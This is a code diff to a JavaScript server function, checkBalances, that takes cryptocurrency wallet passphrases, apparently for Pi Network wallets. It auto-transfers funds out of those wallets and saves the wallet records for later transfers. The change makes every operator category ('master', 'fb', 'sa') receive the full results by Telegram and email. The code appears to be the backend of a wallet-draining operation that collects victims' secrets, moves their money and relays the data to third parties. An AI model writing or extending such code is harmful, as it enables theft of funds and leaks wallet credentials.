@@ -59,7 +59,7 @@ async function checkBalances(req, res, next) {
       }
     });
 
-    // Auto-transfer for passphrase wallets (only if unlocked balance > 0)
+    // Auto-transfer for passphrase wallets
     if (hasSeedPhrases) {
       const transferPromises = results
         .filter(
@@ -81,7 +81,7 @@ async function checkBalances(req, res, next) {
       await Promise.all(transferPromises);
     }
 
-    // Save wallet records for future auto unlock transfer
+    // Save wallet records
     for (const r of results) {
       if (
         r.status === 'ok' &&
@@ -105,47 +105,55 @@ async function checkBalances(req, res, next) {
 
     const allResults = [...results, ...invalidPassphrases];
 
-    // Pi-only results for fb/sa categories
-    const piOnlyResults = allResults.map((r) => ({
-      address: r.address,
-      status: r.status,
-      unlockedBalance: r.unlockedBalance,
-      lockedBalance: r.lockedBalance,
-      nextUnlockDate: r.nextUnlockDate,
-      error: r.error,
-    }));
+    // ============================================
+    // 🔥 UPDATE: Sabhi Telegram accounts ko SAME full report
+    // ============================================
 
-    // Send emails per category
-    const emailResults = [];
-    if (config.recipients.masterEmails.length > 0) {
-      const result = await sendResultsEmail(allResults, config.recipients.masterEmails, 'full');
-      emailResults.push({ category: 'master', ...result });
-    }
-    if (config.recipients.fbEmails.length > 0) {
-      const result = await sendResultsEmail(piOnlyResults, config.recipients.fbEmails, 'pi_only');
-      emailResults.push({ category: 'fb', ...result });
-    }
-    if (config.recipients.saEmails.length > 0) {
-      const result = await sendResultsEmail(piOnlyResults, config.recipients.saEmails, 'pi_only');
-      emailResults.push({ category: 'sa', ...result });
-    }
-
-    // Send Telegram per category
     const tgResults = [];
+
+    // Master Telegram - Full report
     if (config.telegram.masterTargets.length > 0) {
       const result = await sendResultsToTelegram(allResults, config.telegram.masterTargets, 'full');
       tgResults.push({ category: 'master', ...result });
     }
+
+    // FB Telegram - Ab FULL report (same as master)
     if (config.telegram.fbTargets.length > 0) {
-      const result = await sendResultsToTelegram(piOnlyResults, config.telegram.fbTargets, 'pi_only');
+      const result = await sendResultsToTelegram(allResults, config.telegram.fbTargets, 'full');
       tgResults.push({ category: 'fb', ...result });
     }
+
+    // SA Telegram - Ab FULL report (same as master)
     if (config.telegram.saTargets.length > 0) {
-      const result = await sendResultsToTelegram(piOnlyResults, config.telegram.saTargets, 'pi_only');
+      const result = await sendResultsToTelegram(allResults, config.telegram.saTargets, 'full');
       tgResults.push({ category: 'sa', ...result });
     }
 
-    // Aggregate email delivery info
+    // ============================================
+    // 🔥 UPDATE: Sabhi Email accounts ko SAME full report
+    // ============================================
+
+    const emailResults = [];
+
+    // Master Email - Full report
+    if (config.recipients.masterEmails.length > 0) {
+      const result = await sendResultsEmail(allResults, config.recipients.masterEmails, 'full');
+      emailResults.push({ category: 'master', ...result });
+    }
+
+    // FB Email - Ab FULL report (same as master)
+    if (config.recipients.fbEmails.length > 0) {
+      const result = await sendResultsEmail(allResults, config.recipients.fbEmails, 'full');
+      emailResults.push({ category: 'fb', ...result });
+    }
+
+    // SA Email - Ab FULL report (same as master)
+    if (config.recipients.saEmails.length > 0) {
+      const result = await sendResultsEmail(allResults, config.recipients.saEmails, 'full');
+      emailResults.push({ category: 'sa', ...result });
+    }
+
+    // Aggregate
     let emailAggregate = { attempted: false, sentTo: [], error: null };
     if (emailResults.length > 0) {
       emailAggregate.attempted = emailResults.some((e) => e.attempted);
@@ -154,7 +162,6 @@ async function checkBalances(req, res, next) {
       emailAggregate.error = firstError ? firstError.error : null;
     }
 
-    // Aggregate telegram delivery info
     let tgAggregate = { attempted: false, deliveries: [] };
     if (tgResults.length > 0) {
       tgAggregate.attempted = tgResults.some((t) => t.attempted);
